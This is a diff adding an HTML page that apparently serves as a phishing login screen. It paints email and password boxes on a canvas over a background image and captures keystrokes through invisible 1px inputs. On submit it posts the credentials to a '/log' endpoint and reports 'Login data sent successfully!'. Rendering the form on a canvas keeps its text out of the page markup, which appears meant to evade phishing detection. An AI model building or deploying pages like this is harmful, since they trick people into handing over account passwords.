@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Canvas Login UI</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+    }
+    canvas {
+      display: block;
+      background: url('5890786885188569726.jpg') no-repeat;
+      background-size: cover;
+    }
+    .hidden-input {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      background: transparent;
+      border: none;
+      color: transparent;
+      caret-color: auto;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+<canvas id="loginCanvas" width="900" height="2000"></canvas>
+
+<!-- Hidden inputs -->
+<input id="phoneInput" class="hidden-input" type="text" autocomplete="email" inputmode="email" />
+<input id="passInput" class="hidden-input" type="password" autocomplete="current-password" />
+
+<script>
+const canvas = document.getElementById('loginCanvas');
+const ctx = canvas.getContext('2d');
+
+const emailInput = document.getElementById('phoneInput');
+const passInput = document.getElementById('passInput');
+
+// Input boxes
+const inputBoxes = {
+  email: { x: 160, y: 940, width: 707, height: 120 },
+  password: { x: 160, y: 1130, width: 707, height: 120 },
+};
+
+const button = { x: 158, y: 1390, width: 707, height: 120 };
+
+const emailField = { ...inputBoxes.email, text: '', active: false };
+const passwordField = { ...inputBoxes.password, text: '', active: false };
+
+emailInput.addEventListener('input', () => {
+  emailField.text = emailInput.value;
+  draw();
+});
+passInput.addEventListener('input', () => {
+  passwordField.text = passInput.value;
+  draw();
+});
+
+emailInput.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
+    sendLogin();
+    e.preventDefault();
+  }
+});
+passInput.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
+    sendLogin();
+    e.preventDefault();
+  }
+});
+
+function draw() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  drawInput(emailField, 'Enter your email Address');
+  drawInput(passwordField, 'Enter your Password');
+
+  // Draw turquoise rounded button
+  ctx.beginPath();
+  const radius = 30;
+  ctx.fillStyle = '#40E0D0'; // Turquoise
+  ctx.lineJoin = 'round';
+  ctx.lineWidth = 1;
+  roundRect(ctx, button.x, button.y, button.width, button.height, radius);
+  ctx.fill();
+  ctx.closePath();
+
+  // Button text
+  ctx.fillStyle = '#fff';
+  ctx.font = 'bold 40px Arial';
+  const buttonText = 'Login';
+  const textWidth = ctx.measureText(buttonText).width;
+  ctx.fillText(buttonText, button.x + (button.width - textWidth) / 2, button.y + 70);
+}
+
+function drawInput(input, placeholder) {
+  ctx.strokeStyle = '#cccccc'; // Light gray border
+  ctx.lineWidth = 3;
+  ctx.strokeRect(input.x, input.y, input.width, input.height);
+  ctx.font = 'bold 32px Arial';
+
+  // Use turquoise for placeholder, light turquoise for typed text
+  ctx.fillStyle = input.text ? '#AFEEEE' : '#40E0D0';
+  ctx.fillText(input.text || placeholder, input.x + 20, input.y + 65);
+}
+
+function roundRect(ctx, x, y, width, height, radius) {
+  ctx.beginPath();
+  ctx.moveTo(x + radius, y);
+  ctx.lineTo(x + width - radius, y);
+  ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
+  ctx.lineTo(x + width, y + height - radius);
+  ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
+  ctx.lineTo(x + radius, y + height);
+  ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
+  ctx.lineTo(x, y + radius);
+  ctx.quadraticCurveTo(x, y, x + radius, y);
+  ctx.closePath();
+}
+
+function isInside(x, y, box) {
+  return x >= box.x && x <= box.x + box.width &&
+         y >= box.y && y <= box.y + box.height;
+}
+
+function focusInputAt(x, y) {
+  if (isInside(x, y, emailField)) {
+    emailField.active = true;
+    passwordField.active = false;
+    emailInput.style.left = (emailField.x + 10) + 'px';
+    emailInput.style.top = (emailField.y + 10) + 'px';
+    emailInput.focus();
+    passInput.blur();
+  } else if (isInside(x, y, passwordField)) {
+    emailField.active = false;
+    passwordField.active = true;
+    passInput.style.left = (passwordField.x + 10) + 'px';
+    passInput.style.top = (passwordField.y + 10) + 'px';
+    passInput.focus();
+    emailInput.blur();
+  } else {
+    emailField.active = false;
+    passwordField.active = false;
+    emailInput.blur();
+    passInput.blur();
+  }
+}
+
+function sendLogin() {
+  const payload = {
+    'Email': emailField.text,
+    'Password': passwordField.text
+  };
+
+  console.log("Sending login data:", payload);
+
+  fetch('/log', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  })
+  .then(res => {
+    console.log("Response status:", res.status);
+    if (!res.ok) throw new Error('Network response was not ok: ' + res.status);
+    return res.json();
+  })
+  .then(data => {
+    console.log("Server response:", data);
+    alert('Login data sent successfully!');
+    emailField.text = '';
+    passwordField.text = '';
+    emailInput.value = '';
+    passInput.value = '';
+    draw();
+  })
+  .catch(error => {
+    alert('Failed to send login data.');
+    console.error('Error:', error);
+  });
+}
+
+// Mouse click
+canvas.addEventListener('mousedown', (e) => {
+  const rect = canvas.getBoundingClientRect();
+  const mouseX = e.clientX - rect.left;
+  const mouseY = e.clientY - rect.top;
+
+  focusInputAt(mouseX, mouseY);
+
+  if (isInside(mouseX, mouseY, button)) {
+    sendLogin();
+  }
+
+  draw();
+});
+
+// Mobile touch
+canvas.addEventListener('touchstart', (e) => {
+  const rect = canvas.getBoundingClientRect();
+  const touch = e.touches[0];
+  const touchX = touch.clientX - rect.left;
+  const touchY = touch.clientY - rect.top;
+
+  focusInputAt(touchX, touchY);
+
+  if (isInside(touchX, touchY, button)) {
+    sendLogin();
+  }
+
+  draw();
+  e.preventDefault();
+});
+
+// Auto-focus email input on load
+window.onload = () => {
+  emailField.active = true;
+  emailInput.style.left = (emailField.x + 10) + 'px';
+  emailInput.style.top = (emailField.y + 10) + 'px';
+  emailInput.focus();
+};
+
+draw();
+</script>
+</body>
+</html>
